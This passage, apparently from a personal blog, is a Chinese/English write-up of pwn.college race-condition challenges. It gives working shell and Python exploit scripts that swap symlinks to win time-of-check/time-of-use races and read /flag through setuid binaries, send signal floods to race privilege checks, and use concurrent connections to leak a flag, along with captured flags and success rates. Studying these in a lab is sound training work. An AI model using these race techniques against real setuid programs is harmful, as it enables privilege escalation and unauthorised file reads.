&#x27;pwn&#x27;)<br>    if [ $res ]<br>    then<br>        ((rates++))<br>    fi<br>done<br>echo longpath: $rate/1000<br>echo path_2: $ratess/1000<br>echo shortpath: $rates/1000<br></code></pre></div></td></tr></table></figure>

<p>结果:</p>
<p>不带sleep:</p>
<img src="../../image/pwn-modules/image-20220515153055539.png" srcset="/img/loading.gif" lazyload alt="image-20220515153055539" style="zoom:80%;" />

<p>带了sleep(0.05s):</p>
<img src="../../image/pwn-modules/image-20220515153138069.png" srcset="/img/loading.gif" lazyload alt="image-20220515153138069" style="zoom:80%;" />

<p>和好多因素有关, 不过不用sleep看起来更高效, 但是没见到长路径带来的好处…….</p>
<p>好了, 有了新发现, 产生竞态条件的shell脚本中第一个sleep看起来没什么意义然后尝试删除, <strong>成功率直接大幅上涨</strong>:</p>
<img src="../../image/pwn-modules/image-20220515155725438.png" srcset="/img/loading.gif" lazyload alt="image-20220515155725438" style="zoom:80%;" />

<p>不过长路径还是没啥作用. 如果不加上<strong>sleep 0.0005</strong>, 那么成功率直降为5/1000.</p>
<p>会随着sleep的时间波动, 还是0.0005最高. 在0.005的时候出现path_2的成功率最高. 全都是迷之行为, 至于nice就不试了….</p>
<h4 id="level2-2"><a href="#level2-2" class="headerlink" title="level2"></a>level2</h4><p>完全一样</p>
<h4 id="level3-3"><a href="#level3-3" class="headerlink" title="level3"></a>level3</h4><p>在前两题的基础之上检查大小不能超过256字节, 而且在buf[256]之后有一个控制进入win()的v7, 改改文件名很容易绕过</p>
<p>看了office hours, 用了python的os模块, 尝试了os.fork+分开unlink和symlink+strace程序的系统调用时间并分析窗口(这个窗口比较小). 没试出来什么更好的结果. </p>
<h4 id="level4-4"><a href="#level4-4" class="headerlink" title="level4"></a>level4</h4><p>利用上面的方法更改打开文件进行栈溢出然后改跳转地址跳转到win().</p>
<p>什么保护都没开, 固定地址加载.</p>
<h4 id="level5-5"><a href="#level5-5" class="headerlink" title="level5"></a>level5</h4><blockquote>
<p>思考的一些过程……</p>
<p>接受一个绝对路径, 除了一些检查(symlink, argname), 还有文件所在目录所有者只能是root, 其他用户没有在此文件夹写的权限.</p>
<p>???? 不过在看了看dirname的实现之后发现并不需要一个绝对路径.</p>
<img src="../../image/pwn-modules/image-20220512222315120.png" srcset="/img/loading.gif" lazyload alt="image-20220512222315120" style="zoom:80%;" />

<ul>
<li>这样的话, <del>参数就定成/home/hacker下的e(0 size file),</del>  </li>
</ul>
</blockquote>
<p>dirname()只是一个字符串操作, 会截取前面的一部分路径. 所以不能在参数中使用相对路径, 否则dirname会返回当前文件夹: <code>.</code>, 这样没法绕过dirname, 工作目录又不能改成除了hacker之外的.</p>
<p>第一阶段只判断了文件存在与否以及符号链接(no follow lstat), 第二阶段才判断目录信息(use dirname() strip argv[1], and follow link stat), 第三阶段是真正的打开文件.</p>
<ul>
<li>首先touch一个/home/hacker/aa/bb文件, 通过name和symlink验证, </li>
<li>然后ln两个/home/hacker/aa -&gt; /home, 不用管bb其实根本不在/home中.</li>
<li>最后再ln一个/home/hacker/aa/bb -&gt; /flag</li>
</ul>
<p>也许有更好的办法, :</p>
<ul>
<li>最开始创建<code>./1/aa/bb(plain file)</code>, <code>./2/aa -&gt; /home</code>, <code>./3/aa/bb -&gt; /flag</code></li>
<li>然后创建一个symlink叫做dir.</li>
<li>首先指向<code>./1</code>, 然后指向<code>./2</code>, 最后指向<code>./3</code>.</li>
<li>这样只要每次unlink dir然后再symlink相应数字文件夹名就行了.<br>完整路径名为<code>/home/hacker/dir/aa/bb</code> </li>
<li>由于这样子实在太快导致窗口时间都跟不上了. 添加sleep, 大概是0.0001s</li>
</ul>
<h5 id="shell"><a href="#shell" class="headerlink" title="shell"></a>shell</h5><p>写了一个脚本避免重复输入一些命令, 不过想清楚之后倒是一遍过了.</p>
<figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash">!/bin/bash</span><br><br>if [ $1 == &#x27;init&#x27; ]<br>then<br>    cd<br>    mkdir a<br>    cd a<br>    touch b<br>elif [ $1 == 2 ]<br>then<br>    cd<br>    mv a b<br>    ln -s /home /home/hacker/a<br>elif [ $1 == 3 ]<br>then<br>    cd<br>    rm a ./b/b<br>    mv b a<br>    ln -s /flag /home/hacker/a/b<br>elif [ $1 == &#x27;cls&#x27; ]<br>then<br>    rm -r a b 2&gt;/dev/null<br>else<br>    echo &#x27;invalid argument&#x27;<br>fi<br></code></pre></div></td></tr></table></figure>

<p>woc, 我就说怎么不太像竞态条件, 原来.0只是教学, .1都没有getchar()这个函数了.</p>
<p>重新做一下.</p>
<figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash">!/bin/bash</span><br><br>rm aa bb cc -rf 2&gt;/dev/null<br>mkdir aa<br>touch ./aa/bb<br>ln -s /home /home/hacker/cc<br>ln -s /flag /home/hacker/aa/cc<br><span class="hljs-meta">#</span><span class="bash">sleep 0.0005</span><br>while [ 1 ]<br>do<br>    sleep 0.0005<br>    mv aa bb	#change dir name<br>    mv cc aa	#let aa-&gt;/home<br>    sleep 0.0005<br>    <br>    mv aa cc #now cc -&gt; /home, bb is dirctory<br>    mv bb aa #restore aa(dir)<br>    mv ./aa/bb ./aa/dd<br>    mv ./aa/cc ./aa/bb #now ./aa has bb-&gt;/flag, dd plainfile<br>    sleep 0.0005<br>    <br>    #restore context, for non-symlink check<br>    mv ./aa/bb ./aa/cc<br>    mv ./aa/dd ./aa/bb<br>done<br></code></pre></div></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash">!/bin/bash</span><br><span class="hljs-meta">#</span><span class="bash">持续执行challenge的shell</span><br><br>while [[ 1 ]]<br>do<br>    res=$(/challenge/babyrace_level5.1 /home/hacker/aa/bb | grep &#x27;pwn&#x27;)<br>    if [ $res ]<br>    then<br>        printf &quot;\n$res\n\n&quot;<br>        exit<br>    fi<br>done<br></code></pre></div></td></tr></table></figure>

<p>过不了啊啊啊…</p>
<h5 id="python大法-key补充"><a href="#python大法-key补充" class="headerlink" title="python大法+key补充"></a>python大法+key补充</h5><ul>
<li>unlink: delete a name from filesystem. 真是个集合了一堆功能的系统调用, 能删 文件 symlink socket FIFO device.</li>
<li>一些常数是用os.CONSTANT来调用的.</li>
<li>如果使用python的builtin function <code>open</code>的话, 会调用fstat ioctl这种没有什么必要的函数. 可以使用os.open来调用低级的函数.</li>
</ul>
<p>看视频尝试python写法:</p>
<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os,sys,time<br><span class="hljs-keyword">from</span> os <span class="hljs-keyword">import</span> symlink, unlink<br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(sys.argv) &gt; <span class="hljs-number">1</span>:<br>    <span class="hljs-keyword">if</span> sys.argv[<span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;rm&#x27;</span>:<br>        os.system(<span class="hljs-string">&#x27;rm -r $(ls | egrep -v &quot;*py&quot;)&#x27;</span>)<br>        exit()<br>    <span class="hljs-keyword">elif</span> sys.argv[<span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;init&#x27;</span> :<br>        os.system(<span class="hljs-string">&#x27;rm -r $(ls | egrep -v &quot;*py&quot;)&#x27;</span>)<br>        os.system(<span class="hljs-string">&#x27;./initpy&#x27;</span>)<br>        exit()<br><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    time.sleep(<span class="hljs-number">0.0001</span>)<br>    <span class="hljs-comment">#now dir -&gt; 1, need to be unlinked</span><br>    unlink(<span class="hljs-string">&#x27;./dir&#x27;</span>)<br>    symlink(<span class="hljs-string">&#x27;./2&#x27;</span>, <span class="hljs-string">&#x27;./dir&#x27;</span>)<br><br>    <span class="hljs-comment">#now change dir to 3</span><br>    unlink(<span class="hljs-string">&#x27;./dir&#x27;</span>)<br>    symlink(<span class="hljs-string">&#x27;./3&#x27;</span>, <span class="hljs-string">&#x27;./dir&#x27;</span>)<br>    time.sleep(<span class="hljs-number">0.00003</span>)<br>    <br>    <span class="hljs-comment">#now restore context</span><br>    unlink(<span class="hljs-string">&#x27;./dir&#x27;</span>)<br>    symlink(<span class="hljs-string">&#x27;./1&#x27;</span>, <span class="hljs-string">&#x27;./dir&#x27;</span>)<br></code></pre></div></td></tr></table></figure>

<p>initpy:</p>
<figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash">!/bin/bash</span><br>mkdir -p ./1/aa<br>touch ./1/aa/bb<br><br>mkdir -p ./2<br>ln -s /home ./2/aa #这里还出错过.<br><br>mkdir -p ./3/aa<br>ln -s /flag ./3/aa/bb<br><br>ln -s /home/hacker/1 ./dir<br></code></pre></div></td></tr></table></figure>

<p>测试:</p>
<figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">(for i in &#123;1..1000&#125;;do /challenge/babyrace_level5.1 ./dir/aa/bb;done) | egrep &#x27;Error|pwn&#x27; | sort | uniq -c<br></code></pre></div></td></tr></table></figure>

<p>结果:</p>
<figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">    356 Error: directory not owned by root!<br>     44 Error: failed to get directory status!<br>    116 Error: failed to get file status!<br>    472 Error: file is a symlink!<br>      3 pwn.college&#123;ojL-wiqjv9XYN-GR2XsuQ-yucpZ.QXwEDNsMTM1IzW&#125;<br>or<br>	5218 Error: directory not owned by root!<br>    896 Error: failed to get directory status!<br>   1300 Error: failed to get file status!<br>   2422 Error: file is a symlink!<br>     19 pwn.college&#123;ojL-wiqjv9XYN-GR2XsuQ-yucpZ.QXwEDNsMTM1IzW&#125;<br></code></pre></div></td></tr></table></figure>

<p>成功率最多就是20/10000, 2‰…….看视频去了, 不知道有没更好的. 太玄学了, 而且这是只是在一个4 core docker里面, 现实机器那不得更多进程+更多cpu内核+奇怪调度算法, 那是我能研究的?直接下一题, cow也是直接上大数量循环. </p>
<h4 id="level6-5"><a href="#level6-5" class="headerlink" title="level6"></a>level6</h4><p>和上一题相同, 不过dirname之后使用的是lstat, 不follow symlink……</p>
<p>???????????????????????????????</p>
<ul>
<li>首先touch一个/home/hacker/a/home/b文件, 通过name和symlink验证, </li>
<li>然后ln两个/home/hacker/a -&gt; /, 那么原path的dirname就是指: /home/hacker/a/home</li>
<li>最后再ln一个/home/hacker/a/home/b -&gt; /flag</li>
</ul>
<p>改版:</p>
<ul>
<li>首先touch一个/home/hacker/1/a/home/b文件, 通过name和symlink验证, </li>
<li>然后ln个/home/hacker/2/a -&gt; /, 那么原path的dirname就是指: /home/hacker/dir(2)/a/home</li>
<li>最后再ln一个/home/hacker/3(dir)/a/home/b -&gt; /flag</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash">!/bin/bash</span><br><br>if [ $1 == &#x27;init&#x27; ]<br>then<br>    cd<br>    mkdir -p a/home<br>    touch a/home/b<br>elif [ $1 == 2 ]<br>then<br>    cd<br>    mv a b<br>    ln -s / /home/hacker/a<br>elif [ $1 == 3 ]<br>then<br>    cd<br>    rm a ./b/home/b<br>    mv b a<br>    ln -s /flag /home/hacker/a/home/b<br>elif [ $1 == &#x27;cls&#x27; ]<br>then<br>    rm -r a b 2&gt;/dev/null<br>else<br>    echo &#x27;invalid argument&#x27;<br>fi<br></code></pre></div></td></tr></table></figure>

<h5 id="python"><a href="#python" class="headerlink" title="python:"></a>python:</h5><p>unlink symlink只要0.000035s就可以完成系统调用.</p>
<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os,sys,time<br><span class="hljs-keyword">from</span> os <span class="hljs-keyword">import</span> symlink, unlink<br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(sys.argv) &gt; <span class="hljs-number">1</span>:<br>    <span class="hljs-keyword">if</span> sys.argv[<span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;rm&#x27;</span>:<br>        os.system(<span class="hljs-string">&#x27;rm -r $(ls | egrep -v &quot;*py&quot;)&#x27;</span>)<br>        exit()<br>    <span class="hljs-keyword">elif</span> sys.argv[<span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;init&#x27;</span> :<br>        os.system(<span class="hljs-string">&#x27;rm -r $(ls | egrep -v &quot;*py&quot;)&#x27;</span>)<br>        os.system(<span class="hljs-string">&#x27;./initpy&#x27;</span>)<br>        exit()<br><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    time.sleep(<span class="hljs-number">0.0001</span>)<br>    <span class="hljs-comment">#now dir -&gt; 1, need to be unlinked</span><br>    unlink(<span class="hljs-string">&#x27;./dir&#x27;</span>)<br>    symlink(<span class="hljs-string">&#x27;./2&#x27;</span>, <span class="hljs-string">&#x27;./dir&#x27;</span>)<br><br>    <span class="hljs-comment">#now change dir to 3</span><br>    unlink(<span class="hljs-string">&#x27;./dir&#x27;</span>)<br>    symlink(<span class="hljs-string">&#x27;./3&#x27;</span>, <span class="hljs-string">&#x27;./dir&#x27;</span>)<br>    time.sleep(<span class="hljs-number">0.00003</span>)<br>    <br>    <span class="hljs-comment">#now restore context</span><br>    unlink(<span class="hljs-string">&#x27;./dir&#x27;</span>)<br>    symlink(<span class="hljs-string">&#x27;./1&#x27;</span>, <span class="hljs-string">&#x27;./dir&#x27;</span>)<br></code></pre></div></td></tr></table></figure>

<p>initpy:</p>
<figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash">!/bin/bash</span><br>mkdir -p ./1/a/home<br>touch ./1/a/home/b<br><br>mkdir -p ./2<br>ln -s / ./2/a<br><br>mkdir -p ./3/a/home<br>ln -s /flag ./3/a/home/b<br><br>ln -s /home/hacker/1 ./dir<br></code></pre></div></td></tr></table></figure>

<p><code>./dir/a/home/b</code> </p>
<p>测试:</p>
<figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">(for i in &#123;1..20000&#125;;do /challenge/babyrace_level6.1 ./dir/a/home/b;done) \<br>| egrep &#x27;Error|pwn&#x27; | sort | uniq -c<br></code></pre></div></td></tr></table></figure>

<p>成功率降到了20/20000, 变成千分之一了……..</p>
<h4 id="level7-4"><a href="#level7-4" class="headerlink" title="level7"></a>level7</h4><p>保护全开. 做不出来, 去看了看<code>.0</code>程序的race point在哪里.</p>
<p>没看懂. 噢, 我在discord上面看到了提示!!! 才想起来视频里有提到signal, 而且这次也有signal handler.</p>
<p>一开始还在想这岂不是要等十分钟, 然后突然想起来有系统调用可以给其他进程发送信号.</p>
<p>而且程序中的timeout_handler也只是执行logout而已. 这样race point就很明显了, 只要一次成功就可以了.</p>
<figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c">    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> ( !<span class="hljs-built_in">strcmp</span>(s1, <span class="hljs-string">&quot;win_authed&quot;</span>) )<br>    &#123;<br>      <span class="hljs-keyword">if</span> ( privilege_level )<br>      &#123;<br><span class="hljs-comment">//就是这里--------------------------------------------------------</span><br>        <span class="hljs-keyword">if</span> ( privilege_level == <span class="hljs-number">1</span> )<br>          <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Your privilege level is too low!&quot;</span>);<br>        <span class="hljs-keyword">else</span><br>          win();<br>      &#125;<br>      <span class="hljs-keyword">else</span><br>      &#123;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;You are not logged in!&quot;</span>);<br>      &#125;&#125;<br></code></pre></div></td></tr></table></figure>

<p>有一个kill系统调用, <del>要知道pid参数的话那还是直接用pwntools启动, 不知道python的sendline耗时如何….</del>算了不用了</p>
<ul>
<li>总之命令行里启动challenge, 永真循环里echo <code>login</code>和<code>win_authed</code>两条命令, 即<code>login\nwin_authed\n</code>.</li>
<li>然后命令行永真循环, 不停kill pid 14.</li>
</ul>
<p>非常直接, 成功率也是非常的低:</p>
<figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">while true;do kill -s 14 465;done<br>(while true;do printf &#x27;login\nwin_authed\n&#x27;;done)|/challenge/babyrace_level7.1|grep &#x27;pwn&#x27;<br>ps aux<br></code></pre></div></td></tr></table></figure>

<h4 id="level8-4"><a href="#level8-4" class="headerlink" title="level8"></a>level8</h4><ul>
<li>调试可以使用practice mode中的sudo gdb, 或者使用pwntools以非set_uid启动程序.<ul>
<li><code>info thread</code> + <code>thread [num]</code> </li>
<li>第一个hit breadpoint的线程会停下来, gdb还会切换到那个线程上.</li>
</ul>
</li>
<li><code>ps auxH</code> 显示线程.</li>
<li>看了几眼python上的concurrent.futures<ul>
<li>都在下面了. 主要就是processExecutor, 参数是上限, 形象成一个pool(进程池)可以根据需要使用.</li>
</ul>
</li>
</ul>
<p><a target="_blank" rel="noopener" href="https://akkadia.org/drepper/tls.pdf">ELF Handling For TLS</a> | <a target="_blank" rel="noopener" href="https://maskray.me/blog/2021-02-14-all-about-thread-local-storage">哪位神的TLS variable文章</a> | <a target="_blank" rel="noopener" href="https://www.cs.cmu.edu/afs/cs/academic/class/15492-f07/www/pthreads.html">看起来不错的教程</a><br>上面是有关程序中使用的fs来定位线程私有变量的原理.</p>
<p>每个线程有自己的空间, 但是privilege_level是全局的. 使用pwntools开两个连接, 和上一题一样的做法.</p>
<p>成功率2/10000=0.2‰</p>
<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> concurrent.futures<br><span class="hljs-keyword">import</span> pwn<br><br>pwn.context.update(encoding=<span class="hljs-string">&#x27;latin&#x27;</span>)<br><br>process = pwn.process(<span class="hljs-string">&#x27;/challenge/babyrace_level8.1&#x27;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">work</span>(<span class="hljs-params">cmd</span>):</span><br>    <span class="hljs-keyword">with</span> pwn.remote(<span class="hljs-string">&#x27;localhost&#x27;</span>, <span class="hljs-number">1337</span>) <span class="hljs-keyword">as</span> remote:<br>        pwn.info(remote.recvline().decode())<br>        remote.send(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;cmd&#125;</span> &#x27;</span> * <span class="hljs-number">10000</span>)<br>        pwn.info(remote.clean().decode())<br><br><span class="hljs-keyword">with</span> concurrent.futures.ProcessPoolExecutor(<span class="hljs-number">3</span>) <span class="hljs-keyword">as</span> pool:<br>    future = []<br>    future.append(pool.submit(work, <span class="hljs-string">&#x27;login&#x27;</span>))<br>    future.append(pool.submit(work, <span class="hljs-string">&#x27;logout&#x27;</span>))<br>    future.append(pool.submit(work, <span class="hljs-string">&#x27;win_authed&#x27;</span>))<br>    concurrent.futures.wait(future)<br></code></pre></div></td></tr></table></figure>

<h4 id="level9-4"><a href="#level9-4" class="headerlink" title="level9"></a>level9</h4><p>看到个新模块<code>psutil</code>. </p>
<p>执行send_redacted_flag命令时, 向函数栈帧中的的缓冲区写入”REDACTED: “, terminated with null-byte, which is 11bytes long(plus null-byte). Then calling open-&gt;read to read flag into the buffer, right after the previous string’s null-byte.</p>
<p>if now try to use command <code>receive_message</code> to print out string containing the flag, the function will stop at 11th position, because write() function’s <code>n</code> argment is given by strlen() evaluating string in global_message.</p>
<p>so the the procedure is as follows:</p>
<ul>
<li><p>In one thread(connection), first send <code>send_redacted_flag</code> command. </p>
</li>
<li><p>Between this and next command, another thread send <code>send_message</code> command, overwrite until the global_message’s 11th char, <strong>before assigning null-byte to the end of string</strong>.</p>
<img src="../../image/pwn-modules/image-20220519155802133.png" srcset="/img/loading.gif" lazyload alt="image-20220519155802133" style="zoom:80%;" /></li>
<li><p>and first thread now continue executing at <code>receive_message</code> command. after the strlen() function, the return value means 11+[flag’s len], then used in the argment of write().</p>
</li>
</ul>
<p>how to write script….</p>
<ul>
<li>two connections. one send <code>send_redacted_flag -&gt; receive_message</code> sequence, another send <code>send_message</code> with <code>&#39;whatthefuckisthat&#39;</code> continuously(or separated by space in a longlonglong bytestring).</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> concurrent.futures<br><span class="hljs-keyword">import</span> pwn<br><br>process = pwn.process(<span class="hljs-string">&#x27;./babyrace_level9.1&#x27;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">work</span>(<span class="hljs-params">cmd</span>):</span><br>    <span class="hljs-keyword">with</span> pwn.remote(<span class="hljs-string">&#x27;localhost&#x27;</span>, <span class="hljs-number">1337</span>) <span class="hljs-keyword">as</span> remote:<br>        pwn.info(remote.recvline().decode())<br>        remote.send(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;cmd&#125;</span> &#x27;</span> * <span class="hljs-number">10000</span>)<br>        pwn.info(remote.clean().decode())<br><br><span class="hljs-keyword">with</span> concurrent.futures.ProcessPoolExecutor(<span class="hljs-number">3</span>) <span class="hljs-keyword">as</span> pool:<br>    thread = []<br>    thread.append(pool.submit(work, <span class="hljs-string">&#x27;send_redacted_flag receive_message&#x27;</span>))<br>    thread.append(pool.submit(work, <span class="hljs-string">&#x27;send_message whatthefuck&#x27;</span>))<br>    concurrent.futures.wait(thread)<br></code></pre></div></td></tr></table></figure>

<p>something interesting happen….</p>
<figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">9999     Message: <br>   1 [*] Message: <br>   1     Message: REDAChED: \isthatandthis\at the fuck? this is true flag&#125;<br>   1     Message: REDAChefuckisthatandthis\at the fuck? this is true flag&#125;<br> 504     Message: REDACTED: [*] Function (send_message/send_redacted_flag/receive_message/quit): <br>5444     Message: REDACTED: \isthatandthis\at the fuck? this is true flag&#125;<br>   1     Message: REDACTefu \isthatandthis\at the fuck? this is true flag&#125;<br>   1     Message: whatCTEfuckisthatandthis\at the fuck? this is true flag&#125;<br>   1     Message: whattheD: \isthatandthis\at the fuck? this is true flag&#125;<br>   1     Message: whatthef: \isthatandthis\at the fuck? this is true flag&#125;<br>  18     Message: whatthefuc[*] Function (send_message/send_redacted_flag/receive_message/quit): <br>   1     Message: whatthefuc\isthatandthis\at the fuck? this is true flag&#125;<br>4027     Message: whatthefuckisthatandthis\at the fuck? this is true flag&#125;<br><br>   1     Message: whatthefuckisn.ctalege&#123;what the fuck? this is true flag&#125;<br></code></pre></div></td></tr></table></figure>

<p>by patching the program, something strange happened….. how does line 11 occur….? can write syscall to be interrupted and then reenter?</p>
<p>anyway, that’s the way it is.</p>
<h4 id="level10-4"><a href="#level10-4" class="headerlink" title="level10"></a>level10</h4><p>global_message with semaphore: sem_wait() + sem_post()……………</p>
<p>我又不会了…… 做这个真是违反直觉的思考. scp了.0程序, 希望能看出一点提示..没看出来.</p>
<h4 id="level11-4"><a href="#level11-4" class="headerlink" title="level11"></a>level11</h4><p>没看出和上一题有什么区别. 不过在discord上面看到了一点东西.</p>
<blockquote>
